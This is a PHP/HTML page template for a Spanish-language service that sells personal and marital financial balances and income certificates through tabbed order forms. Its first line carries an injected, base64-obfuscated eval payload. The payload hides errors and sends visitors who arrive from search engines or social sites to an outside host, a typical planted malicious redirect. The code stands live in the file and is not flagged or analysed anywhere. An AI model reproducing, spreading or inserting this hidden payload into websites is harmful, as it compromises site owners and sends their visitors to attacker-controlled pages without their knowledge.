<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); session_start();
?>

<script type="text/javascript">

jQuery(document).ready(function() 
{
	$.getScript("js/main.js");
});

</script>

<div id="TabbedPanels1" class="TabbedPanels">
  <ul class="TabbedPanelsTabGroup">
    <li id="tab1" class="TabbedPanelsTab" tabindex="0">Balance Personal</li>
    <li id="tab2" class="TabbedPanelsTab" tabindex="0">Balance Conyugal</li>
    <li id="tab3" class="TabbedPanelsTab" tabindex="0">Certificación de Ingreso</li>
  </ul>
  <div class="TabbedPanelsContentGroup">
    <div class="TabbedPanelsContent">
      <div id="contenedorinput">
        <div id ="visado">
          Nuestros balances seran emitidos con el visado del colegio de contadores y las tarifas incluyen el flete
        </div>
        <div id="pasos">
          <span class="letra_verde">Paso 1: Llena los Datos</span> / Paso 2: Paga / Paso 3: Reporta
        </div>
        <br /><br /><br /><br /><br />
        <div id="personal_form">
          <? require_once 'personal_balance_form.php'; ?>
        </div>
      </div>
    </div>
<!--div id="aux"></div-->
    <div class="TabbedPanelsContent" >        
      <div id="contenedorinput">
        <div id ="visado">
          Nuestros balances seran emitidos con el visado del colegio de contadores y las tarifas incluyen el flete
        </div>
        <div id="pasos">
          <span class="letra_verde">Paso 1: Llena los Datos</span> / Paso 2: Paga / Paso 3: Reporta
        </div>
        <br /><br /><br /><br /><br />
        <div id="conyugal_form">
        </div>
      </div>
    </div>
    <div class="TabbedPanelsContent">
      <div id="contenedorinput">
        <div id ="visado">
          Nuestros balances seran emitidos con el visado del colegio de contadores y las tarifas incluyen el flete
        </div>
        <div id="pasos">
          <span class="letra_verde">Paso 1: Llena los Datos</span> / Paso 2: Paga / Paso 3: Reporta
        </div><br /><br /><br /><br /><br />
        <div id="certificado_form">
        </div>
      </div>
    </div>
  </div>
</div>